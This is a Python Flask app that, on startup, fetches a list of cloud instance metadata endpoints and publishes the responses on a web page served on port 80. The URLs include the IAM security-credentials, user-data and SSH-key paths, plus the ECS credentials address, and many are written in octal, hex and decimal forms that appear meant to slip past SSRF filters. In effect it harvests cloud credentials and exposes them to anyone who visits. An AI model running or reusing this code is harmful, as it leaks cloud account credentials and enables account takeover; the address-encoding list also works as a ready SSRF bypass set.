from flask import Flask
from flask import render_template
from requests.exceptions import RequestException as RequestException
import requests

url_list = [
"http://0251.00376.000251.0000376/",
"http://0251.0376.0251.0376/",
"http://0251.254.169.254",
"http://0x41414141A9FEA9FE/",
"http://0xA9.0xFE.0xA9.0xFE/",
"http://0xA9FEA9FE/",
"http://169.254.169.254.nip.io/",
"http://169.254.169.254",
"http://169.254.169.254/latest/dynamic/instance-identity/document",
"http://169.254.169.254/latest/meta-data/",
"http://169.254.169.254/latest/meta-data/ami-id",
"http://169.254.169.254/latest/meta-data/hostname",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access",
"http://169.254.169.254/latest/meta-data/public-keys/",
"http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
"http://169.254.169.254/latest/meta-data/reservation-id",
"http://169.254.169.254/latest/user-data",
"http://169.254.170.2/v2/credentials",
"http://2852039166/",
"http://2852039166/latest/meta-data/",
"http://425.510.425.510/",
"http://7147006462/",
"http://instance-data"
]

negative_response_list = []
positive_response_list = []
s = requests.Session()

def cache():
    return positive_response_list, negative_response_list

def url_loop():
    for url in url_list:
        try:
            with s:
                url_req = s.get(url, timeout=5)
                url_req_response = url_req.content
                positive_response_list.append("{}: {}".format(url, url_req_response))
        except RequestException as RE:
            negative_response_list.append("{}: {}".format(url, RE))
    return cache

app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False
app.config['PROPAGATE_EXCEPTIONS'] = True
with app.app_context():
    cache()
    url_loop()

@app.errorhandler(500)
def internal_server_error(error):
    return "HTTP 500 error"

@app.errorhandler(404)
def not_found_error(error):
    not_found_msg = """
    <h1>These are not the droids you are looking for.</h1>
    """
    return not_found_msg

@app.route('/')
def index():
    return render_template(
        "index.html", 
        cached_pos=cache()[0], 
        cached_negative=cache()[1])

if __name__ == '__main__':
    app.run(
        host="0.0.0.0", 
        port="80")